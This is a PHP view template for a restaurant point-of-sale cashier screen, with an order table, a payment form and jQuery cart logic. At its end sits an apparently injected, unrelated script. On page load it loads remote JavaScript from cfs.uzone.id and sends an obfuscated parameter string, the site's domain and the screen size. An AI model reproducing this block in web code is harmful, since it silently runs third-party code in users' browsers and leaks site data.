<!DOCTYPE html>
<html lang="en">
<!--<![endif]-->
<!-- BEGIN HEAD -->
<head>
    <meta charset="utf-8"/>
    <title> POS Kasir</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_default.css" rel="stylesheet" id="style_color"/>

    <link href="<?php echo site_url(); ?>assets/assets/fancybox/source/jquery.fancybox.css" rel="stylesheet"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/uniform/css/uniform.default.css"/>
    <link href="<?php echo site_url(); ?>assets/assets/fullcalendar/fullcalendar/bootstrap-fullcalendar.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/jqvmap/jqvmap/jqvmap.css" media="screen" rel="stylesheet" type="text/css"/>
    <style>
        #content1, #content2, #content3 {
            display: none;
        }

        .hidden {
            display: none;
        }
    </style>
</head>

<body class="fixed-top">
<?php $this->load->view('header.php') ?>
<div id="container" class="row-fluid">
    <?php $this->load->view('sidebarKasir.php') ?>
    <div id="main-content">
        <div class="container-fluid">
            <div class="row-fluid">
                <div class="span12">
                    <?php $this->load->view('admin/themeColor.php') ?>
                    <h3 class="page-title">
                        Beranda
                        <small></small>
                    </h3>
                    <ul class="breadcrumb">
                        <li>
                            <a href="#">
                                <i class="icon-home"></i>
                            </a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Lokasi</a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Transaksi</a>
                            <span class="divider-last">&nbsp;</span>
                        </li>

                    </ul>
                </div>
            </div>

            <div id="page" class="dashboard">
                <div class="alert alert-info">
                    <?php
                    $tgl = new Datetime();
                    $now = $tgl->format('l, d-m-Y H:i:s');
                    ?>
                    <strong>
                        <?php echo $now; ?>
                    </strong>
                </div>
            </div>

            <div class="row-fluid">
                <div class="span6">
                    <div class="widget">
                        <div class="widget-body form">
                            <div class='alert alert-info TotalBayar'>
                                <h2>Total :
                                    <span id='TotalBayar'>Rp. 0</span>
                                </h2>
                                <input type="hidden" id='TotalBayarHidden'>
                            </div>
                            <div class="space15"></div>
                            <table class="table table-striped table-hover table-bordered" id="my_table">
                                <thead>
                                <tr>
                                    <th>Produk</th>
                                    <th>Harga</th>
                                    <th>Jumlah</th>
                                    <th>Total</th>
                                    <th>
                                        <i class="icon-tasks"></i>
                                    </th>
                                </tr>
                                </thead>
                                <tbody>
                                </tbody>

                            </table>
                        </div>
                        <div class="widget-body form">
                            <form action="" method="POST" class="form-horizontal">
                                <fieldset>
                                    <div class="control-group">
                                        <label class="control-label">Status Pembelian</label>
                                        <div class="controls">
                                            <select name="statusPesan" class="input-large m-wrap" tabindex="1" required="true">
                                                <option value="ya">Makan di tempat</option>
                                                <option value="tidak">Bawa Pulang</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="control-group">
                                        <label for="name" class="control-label">Nomor Meja</label>
                                        <div class="controls">
                                            <input name="noMeja" type="number" placeholder="Isi disini" class="input-medium" required="true"/>
                                        </div>
                                    </div>
                                    <div class="control-group">
                                        <label for="name" class="control-label">Catatan</label>
                                        <div class="controls">
                                            <textarea class="span6 " rows="3"></textarea>
                                        </div>
                                    </div>
                                    <div class="control-group">
                                        <label for="name" class="control-label">Uang Pembayaran</label>
                                        <div class="controls">
                                            <input name="" type="number" placeholder="Isi disini" class="input-medium" required="true"/>
                                        </div>
                                    </div>
                                    <div class="control-group">
                                        <label for="name" class="control-label">Uang Kembalian</label>
                                        <div class="controls">
                                            <input name="" type="number" placeholder="" class="input-medium" readonly/>
                                        </div>
                                    </div>
                                    <div class="form-actions">
                                        <button type="submit" class="btn blue">
                                            <i class="icon-plus"></i>
                                            Simpan
                                        </button>
                                    </div>
                                </fieldset>
                            </form>
                        </div>

                    </div>
                </div>

                <div class="span6">
                    <div class="widget">
                        <div class="widget-body form">
                            <tr>
                                <td>
                                    <a href="#" onclick="tampil(1);">
                                        <button class="btn btn-large" type="button">Makanan</button>
                                    </a>
                                    <a href="#" onclick="tampil(3);">
                                        <button class="btn btn-large" type="button">Lauk</button>
                                    </a>
                                    <a href="#" onclick="tampil(2);">
                                        <button class="btn btn-large" type="button">Minuman</button>
                                    </a>

                                </td>
                            </tr>

                        </div>
                    </div>
                    <div class="widget">
                        <div class="widget-body form" id="content1">
                            <tr>
                                <td>
                                    <?php
                                    foreach ($makanan as $data)
                                    {
                                        ?>
                                        <div style="display: inline">
                                            <input type="hidden" class="hidden p-key" value="<?php echo $data->id_produk ?>">
                                            <button class="my_button btn btn-large p-cost" value="<?php echo $data->harga_jual ?>"><?php echo $data->nama_produk; ?></button>
                                        </div>

                                    <?php } ?>
                                </td>
                            </tr>

                        </div>
                    </div>
                    <div class="widget">
                        <div class="widget-body form " id="content2">
                            <tr>
                                <td>
                                    <?php
                                    foreach ($minuman as $data)
                                    {
                                        ?>
                                        <div style="display: inline">
                                            <input type="hidden" class="hidden p-key" value="<?php echo $data->id_produk ?>">
                                            <button class="btn btn-large my_button p-cost" type="button" value="<?php echo $data->harga_jual ?>"><?php echo $data->nama_produk; ?></button>
                                        </div>
                                    <?php } ?>
                                </td>
                            </tr>

                        </div>
                    </div>
                    <div class="widget">
                        <div class="widget-body form" id="content3">
                            <tr>
                                <td>
                                    <?php
                                    foreach ($lauk as $data)
                                    {
                                        ?>
                                        <div style="display: inline">
                                            <input type="hidden" class="hidden p-key" value="<?php echo $data->id_produk ?>">
                                            <button class="btn btn-large my_button p-cost" type="button" value="<?php echo $data->harga_jual ?>"><?php echo $data->nama_produk; ?></button>
                                        </div>
                                    <?php } ?>
                                </td>
                            </tr>

                        </div>
                    </div>

                    <div class="row-fluid">
                        <div class="span7 responsive" data-tablet="span7 fix-margin" data-desktop="span7">
                            <!-- BEGIN CALENDAR PORTLET-->

                            <!-- END CALENDAR PORTLET-->
                        </div>
                    </div>
                </div>
                <!-- END PAGE CONTENT-->
            </div>
            <!-- END PAGE CONTAINER-->
        </div>
        <!-- END PAGE -->
    </div>
    <!-- END CONTAINER -->
    <!-- BEGIN FOOTER -->
    <div id="footer">
        2017 &copy; Admin Lab Dashboard for POS.

    </div>
    <script src="<?php echo base_url(); ?>assets/js/jquery-1.8.3.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/assets/jquery-slimscroll/jquery-ui-1.9.2.custom.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/assets/jquery-slimscroll/jquery.slimscroll.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/assets/fullcalendar/fullcalendar/fullcalendar.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/js/jquery.blockui.js"></script>
    <script src="<?php echo base_url(); ?>assets/js/jquery.cookie.js"></script>
    <script src="<?php echo base_url(); ?>assets/js/jquery.peity.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/uniform/jquery.uniform.min.js"></script>
    <script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/data-tables/jquery.dataTables.js"></script>
    <script type="text/javascript" src="<?php echo base_url(); ?>assets/assets/data-tables/DT_bootstrap.js"></script>
    <script src="<?php echo base_url(); ?>assets/js/scripts.js"></script>
    <script>
        jQuery(document).ready(function () {

        });
    </script>


    <script>
        function tampil(nr)
        {
            document.getElementById("content1").style.display     = "none";
            document.getElementById("content2").style.display     = "none";
            document.getElementById("content3").style.display     = "none";
            document.getElementById("content" + nr).style.display = "block";
        }
    </script>

    <script type="text/javascript">
        var p_projection = {};

        function obs_u_p(pid)
        {
            var data      = p_projection[pid];
            var container = $("#my_table").find('tr.' + pid);
            container.find('td.p-n').text(data['n']);
            container.find('td.p-c').text(data['c']);
            container.find('input.p-q').val(data['q']);
            container.find('td.p-t').text(data['c'] * data['q']);
        }

        function obs_d_p(pid)
        {
            $("#my_table").find('tr.' + pid).remove();
        }

        function obs_c_p(pid)
        {
            var data = p_projection[pid];
            $("#my_table").append(
                //@formatter:off
                '<tr class="'+ pid +'">' +
                    '<td class="p-id" style="display: none" >' + pid + '</td>' +
                    '<td class="p-n" >' + data['n'] + '</td>' +
                    '<td class="p-c">' + data['c'] + '</td>' +
                    '<td><input class="input-mini p-q" type="number" value="'+ data['q'] +'" min="1" step="1"></td>' +
                    '<td class="p-t">' + (data['c'] * data['q']) + '</td>' +
                    '<td><a class="p-d " href="" role="button button-warning"><i class="icon-trash "></i></a></td>' +
                '</tr>'
                //@formatter:on
            );
        }

        var myTableBody = $('#my_table').find('tbody');

        myTableBody.on('click', 'a.p-d', function (event) {
            event.preventDefault();
            var pid = $(this).parent().siblings('td.p-id').text();
            delete p_projection[pid];

            obs_d_p(pid);
        });

        myTableBody.on('change', 'input.p-q', function (event) {
            event.preventDefault();
            var pid                = $(this).parent().siblings('td.p-id').text();
            var qty                = $(this).val();
            p_projection[pid]['q'] = qty;
            obs_u_p(pid);
        });

        $("button.my_button").click(function () {
            var id    = $(this).siblings('input.p-key').val();
            var value = $(this).text();
            var harga = $(this).val();
            var pid   = "l_p-" + id;
            if (p_projection[pid] !== undefined)
            {
                ++p_projection[pid]['q'];
                obs_u_p(pid);
            }
            else
            {
                p_projection[pid] = {n: value, c: harga, q: 1};
                obs_c_p(pid);
            }
        });
    </script>

    <!-- END JAVASCRIPTS -->
    <script type="text/javascript">if (self == top)
        {
            function netbro_cache_analytics(fn, callback)
            {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn)
            {
                fn();
            }

            function requestCfs()
            {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r   = Math.floor(Math.random() * 99999999999);
                var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCo3tr%2fhGc2D%2fInIsAo2jh4sOfFtyDaZnVywFAVh1U%2fVRcrbxgjM2m8poDPNxotq21S3PRrvxy19M92oP7S8M0NH%2bPniGoiqp4mqSZPOs6BaIoFPoyNAcZ2rc%2fQ%2fEz6d9b5efudH7y8uJl%2b3vx1mZDldGer6zgdZYZCm%2f3h6yei%2fg5SzNw1RFJD5BmjBUwhpyE7WSmEsGHLxC%2b9L%2bxE00RnO6igQ1x58YaGKmT6L2CSnTLbdA1tWfLDglwut4ZWhCsq6rSpxafYFct0PHiU8v0zK%2fW1GRpbV%2bJD1qZJ1DcKNbUCva8yj2jYeRvgR8sbGZaBk3H2QPw2z2upGKaCYODO1yYHerNRM027bNjIVZjYwyhatpC9N98QpbG6WxfttQNdGiLqiwpJbw%2beFADORWjSR3JneCdVv33gY0FMLLNPTiQhFboHiiD1siUP3HxdJcC9CV1gcZfeil7MK78AAfU9Sk6G%2fB9NKhhDaW44W7kgUfG4jnTaanzDCERPED%2bNZb2I%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa         = document.createElement('script');
                bsa.type        = 'text/javascript';
                bsa.async       = true;
                bsa.src         = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }

            netbro_cache_analytics(requestCfs, function () {
            });
        }
    </script>
</body>
<!-- END BODY -->
</html>